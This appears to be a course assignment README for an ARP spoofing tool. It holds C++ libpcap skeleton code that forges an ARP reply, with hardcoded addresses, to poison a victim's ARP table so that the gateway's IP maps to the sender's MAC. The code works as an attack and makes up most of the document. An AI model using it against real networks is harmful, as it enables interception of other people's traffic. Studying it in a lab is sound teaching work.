# Report-send-arp
infect Sender(Victim)'s ARP table
```
syntax : send-arp [<sender ip 2> <target ip 2> ...] sample : send-arp wlan0 192.168.10.2 192.168.10.1
```
## skeleton code
```
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("18:3e:ef:df:05:e7");
	packet.eth_.smac_ = Mac("00:0c:29:c9:33:3c");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac("00:0c:29:c9:33:3c");
	packet.arp_.sip_ = htonl(Ip("192.168.0.1"));
	packet.arp_.tmac_ = Mac("18:3e:ef:df:05:e7");
	packet.arp_.tip_ = htonl(Ip("192.168.0.22"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}

```
